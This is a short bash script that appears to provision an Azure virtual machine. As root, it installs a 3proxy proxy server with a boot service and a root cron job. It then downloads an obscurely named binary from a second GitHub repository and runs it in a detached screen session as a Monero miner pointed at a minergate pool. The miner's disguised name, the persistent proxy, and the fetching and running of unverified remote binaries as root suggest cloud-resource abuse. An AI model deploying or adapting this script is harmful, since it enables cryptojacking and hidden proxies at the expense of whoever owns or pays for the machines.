#!/bin/bash

sudo bash
git clone https://github.com/dderqw/de3ep.git /home/azureuser/de3ep
mkdir /etc/3proxy
cp /home/azureuser/de3ep/etc/3proxy/3proxy.cfg /etc/3proxy
cp /home/azureuser/de3ep/etc/init.d/3proxyinit /etc/init.d
cp /home/azureuser/de3ep/etc/security/limits.conf /etc/security
cp /home/azureuser/de3ep/usr/bin/3proxy /usr/bin
cp /home/azureuser/de3ep/usr/local/bin/clearcache.sh /usr/local/bin
sudo chmod 444 /etc/3proxy/3proxy.cfg
sudo chmod 755 /usr/bin/3proxy
sudo chmod +x /etc/init.d/3proxyinit
sudo update-rc.d 3proxyinit defaults
sudo chmod 755 /usr/local/bin/clearcache.sh
echo "0 2 * * * /usr/local/bin/clearcache.sh" >> /var/spool/cron/crontabs/root
ulimit -n 600000
sudo /etc/init.d/3proxyinit start
sudo apt-get -y install screen git build-essential libuv1-dev libmicrohttpd-dev libssl-dev
git clone https://github.com/denismatveev199/maretysoas.git /home/azureuser/maretysoas
chmod 775 /home/azureuser/maretysoas/work
screen -d -m /home/azureuser/maretysoas/work -a cryptonight -o xmr.pool.minergate.com:45700 -u $1 -p x -t $2 --donate-level 0 --max-cpu-usage $3
